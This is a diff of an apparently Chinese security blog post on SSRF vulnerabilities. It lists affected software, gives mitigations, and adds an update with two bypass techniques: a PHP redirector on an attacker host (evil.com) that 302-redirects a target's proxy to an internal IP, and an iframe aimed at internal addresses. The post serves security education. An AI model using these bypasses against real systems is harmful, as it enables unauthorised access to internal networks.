@@ -179,7 +179,7 @@
 <ul>
 <li>weblogin配置不当，天生ssrf漏洞</li>
 <li>discuz x2.5/x3.0/x3.1/x3.2 ssrf漏洞</li>
-<li>CVE-2016-<sup>1897</sup>&frasl;<sub>8</sub> - FFMpeg</li>
+<li>CVE-2016-1897/CVE-2016-1898 - FFMpeg</li>
 <li>CVE-2016-3718 - ImageMagick</li>
 </ul>
 
@@ -232,8 +232,40 @@ for x in xrange(1,30):
 <ul>
 <li>限制协议为http或https</li>
 <li>禁止30x转跳</li>
-<li>过滤参数(只要出现内网ip直接干掉)</li>
+<li>过滤参数(只要出现内网ip或域名就直接干掉)</li>
 </ul>
+
+<p><br></p>
+
+<h4 id="20170609更新">===== 20170609更新 =====</h4>
+
+<p>宝哥说的姿势：</p>
+
+<ul>
+<li>302跳转</li>
+</ul>
+
+<blockquote>
+<pre><code class="language-php">//在自己服务器上建立文件，利用302跳转到对方内网地址。
+//http://target.com/httpProxyAccess.htm?go=http://evil.com/a.php?url=http://10.11.213.57
+//a.php内容如下：
+&lt;?php
+    $url = $_GET['url'];
+    header(&quot;Location:&quot;.$url);
+?&gt;
+</code></pre>
+</blockquote>
+
+<ul>
+<li>iframe</li>
+</ul>
+
+<blockquote>
+<pre><code class="language-php">//在自己服务器建立文件，利用iframe标签请求对方内网地址。
+//参考http://www.secpulse.com/archives/50034.html
+&lt;iframe src=&quot;对方内网地址&quot;&gt;
+</code></pre>
+</blockquote>
 
                 
                 <div style="padding:10px 1px;">
